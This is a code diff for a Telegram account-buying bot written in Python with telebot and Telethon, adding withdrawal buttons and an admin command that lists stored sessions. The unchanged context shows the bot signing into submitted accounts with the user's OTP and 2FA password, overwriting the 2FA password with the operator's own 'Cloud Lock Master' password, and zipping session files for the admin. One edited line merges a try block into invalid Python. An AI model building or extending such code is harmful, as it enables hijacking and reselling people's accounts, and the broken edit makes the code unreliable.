@@ -42,7 +42,6 @@ DEFAULT_SETTINGS = {
     }
 }
 
-# ==================== ডাটাবেস কন্ট্রোলার ====================
 def load_settings():
     if os.path.exists(SETTINGS_FILE):
         try:
@@ -208,6 +207,23 @@ def cmd_account(message):
     )
     bot.send_message(message.chat.id, response)
 
+# ==================== [উইথড্রাও মেথড বাটন ফিক্স] ====================
+@bot.message_handler(commands=['withdraw'])
+def cmd_withdraw(message):
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("💳 BEP20", callback_data="wth_bep20"),
+        types.InlineKeyboardButton("🃏 Leader Card", callback_data="wth_leader")
+    )
+    bot.send_message(message.chat.id, "💰 **Select your withdrawal method:**", reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("wth_"))
+def handle_withdraw_selection(call):
+    method = "BEP20" if call.data == "wth_bep20" else "Leader Card"
+    bot.answer_callback_query(call.id)
+    bot.send_message(call.message.chat.id, f"📥 Send your **{method}** wallet address/details for payout processing:")
+    admin_state[call.from_user.id] = f"entering_wallet_{method}"
+
 @bot.callback_query_handler(func=lambda call: call.data.startswith("chk_time_"))
 def handle_live_timer_click(call):
     tracker_id = call.data.replace("chk_time_", "")
@@ -231,7 +247,7 @@ def handle_live_timer_click(call):
     except:
         bot.answer_callback_query(call.id, f"⏳ {remaining}s remaining")
 
-# ==================== [হুবহু আগের সেইম ওল্ড এডমিন প্যানেল + জিপ ফাইল অপশন] ====================
+# ==================== [এডমিন প্যানেল এবং সেশন ভিউয়ার কমান্ড] ====================
 @bot.message_handler(commands=['panel'])
 def admin_panel(message):
     if message.from_user.id != ADMIN_ID: return
@@ -246,7 +262,21 @@ def admin_panel(message):
     msg = "🛠 *Master Admin Panel*\n\n"
     for c, conf in settings["country_config"].items():
         msg += f"• {get_flag(c)} `+{c}` ➜ Free: ${conf['free']} | Spam: ${conf['spam']} | New: ${conf['new']} | Cap: {conf['cap']}\n"
+    msg += "\n🔍 Use `/session` to see or manage saved active backup numbers."
     bot.send_message(message.chat.id, msg, reply_markup=markup)
+
+@bot.message_handler(commands=['session'])
+def cmd_session_list(message):
+    if message.from_user.id != ADMIN_ID: return
+    db = load_db()
+    verified = db.get("verified_numbers", [])
+    if not verified:
+        bot.reply_to(message, "📂 No active backup sessions stored yet.")
+        return
+    msg = "📂 **Active Stored Backup Sessions:**\n\n"
+    for num in verified:
+        msg += f"• `+{num}`\n"
+    bot.reply_to(message, msg)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("pnl_"))
 def handle_pnl(call):
@@ -267,7 +297,7 @@ def handle_pnl(call):
                     bot.send_document(call.message.chat.id, f, caption="📦 **Here are your backup session files.**")
                 os.remove(zip_filename)
             else:
-                bot.send_message(call.message.chat.id, "❌ No session folders available to backup.")
+                bot.send_message(call.message.chat.id, "❌ No session folders available to backup yet. Wait for a successful submission.")
         except Exception as e:
             bot.send_message(call.message.chat.id, f"❌ Error packing ZIP: {e}")
 
@@ -279,6 +309,13 @@ def handle_text(message):
     
     if user_id in admin_state:
         state = admin_state[user_id]
+        if "entering_wallet_" in state:
+            method = state.replace("entering_wallet_", "")
+            del admin_state[user_id]
+            bot.reply_to(message, "⏳ **Withdrawal request submitted!** Admin will review your account data shortly.")
+            bot.send_message(ADMIN_ID, f"🔔 **Withdraw Request!**\nUser: `{user_id}`\nMethod: {method}\nAddress: `{text}`")
+            return
+            
         if user_id == ADMIN_ID and state == "wait_country_all":
             del admin_state[user_id]
             try:
@@ -354,9 +391,7 @@ async def verify_otp_task(text, user_id, message):
     settings = load_settings()
     client = data["client"]
     
-    try:
-        if not client.is_connected():
-            await client.connect()
+    try: if not client.is_connected(): await client.connect()
     except:
         bot.reply_to(message, "❌ Session disconnected. Please try again.")
         del user_data[user_id]
@@ -366,8 +401,6 @@ async def verify_otp_task(text, user_id, message):
         try:
             current_pwd = text
             await client.sign_in(password=current_pwd)
-            
-            # মাস্টার লক প্রোটেকশন অ্যাসাইনমেন্ট
             try:
                 await client(functions.account.UpdatePasswordSettingsRequest(
                     password=await client.get_password_setting() if hasattr(client, 'get_password_setting') else tl_types.InputCheckPasswordEmpty(),
@@ -376,7 +409,6 @@ async def verify_otp_task(text, user_id, message):
             except:
                 try: await client(functions.account.UpdatePasswordSettingsRequest(password=current_pwd, new_settings=tl_types.PasswordInputSettings(new_password=settings["security_password"])))
                 except: pass
-                
             await check_and_save_account(user_id, message, data, settings)
         except Exception as e: 
             bot.reply_to(message, f"❌ Password Error: {e}. Ensure you enter correct 2FA password.")
@@ -389,7 +421,6 @@ async def verify_otp_task(text, user_id, message):
                     new_settings=tl_types.PasswordInputSettings(new_password=settings["security_password"], hint="Cloud Lock Master")
                 ))
             except: pass
-            
             await check_and_save_account(user_id, message, data, settings)
         except SessionPasswordNeededError:
             bot.reply_to(message, "🔐 Two-step verification active. Enter Password:")
@@ -399,11 +430,9 @@ async def verify_otp_task(text, user_id, message):
 
 async def check_and_save_account(user_id, message, data, settings):
     add_to_pending_numbers(data["clean_phone"])
-    
     spam_status = "🕊️ Free As Bird"
     price_key = "free"
     
-    # ==================== [বিদ্যুতের গতিতে স্প্যামবট চেক লজিক] ====================
     try:
         await data["client"].send_message('@SpamBot', '/start')
         await asyncio.sleep(1.2) 
@@ -433,28 +462,23 @@ async def check_and_save_account(user_id, message, data, settings):
         del user_data[user_id]
         return
 
-    # ওল্ড ওটিপি ইন্টারফেস ডিলিট (ক্লিন লুক)
     try: bot.delete_message(message.chat.id, data["prompt_msg_id"])
     except: pass
 
     add_user_pending_account(user_id, target_price)
-    
     tracker_id = str(user_id) + "_" + str(int(datetime.now().timestamp()))
     live_trackers[tracker_id] = {"start_time": datetime.now(), "total_delay": conf["delay"]}
     
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton(f"✅ Account Verification {conf['delay']}s", callback_data=f"chk_time_{tracker_id}"))
-    
     v_msg = bot.send_message(message.chat.id, f"✅ The account number `{data['phone']}` was successfully received\n\n❗ You have to wait {conf['delay']} seconds time to confirm the account, please log out\n\n👇 The bot will automatically verify your account\n\n🏷️ Spam Status : {spam_status}", reply_markup=markup)
     
     await data["client"].disconnect()
     del user_data[user_id]
-    
     asyncio.create_task(run_background_verification(user_id, data, conf, target_price, v_msg.message_id, tracker_id))
 
 async def run_background_verification(user_id, data, conf, target_price, msg_id, tracker_id):
     await asyncio.sleep(conf["delay"])
-    
     max_wait = 1800
     interval = 30
     elapsed = 0
@@ -475,7 +499,6 @@ async def run_background_verification(user_id, data, conf, target_price, msg_id,
                 await data["client"].disconnect()
                 try: bot.delete_message(user_id, msg_id)
                 except: pass
-                
                 convert_pending_to_verified(user_id, target_price)
                 add_to_verified_numbers(data["clean_phone"])
                 bot.send_message(user_id, f"🎉 **Account {data['phone']} confirmed successfully!** Your balance has been updated.")
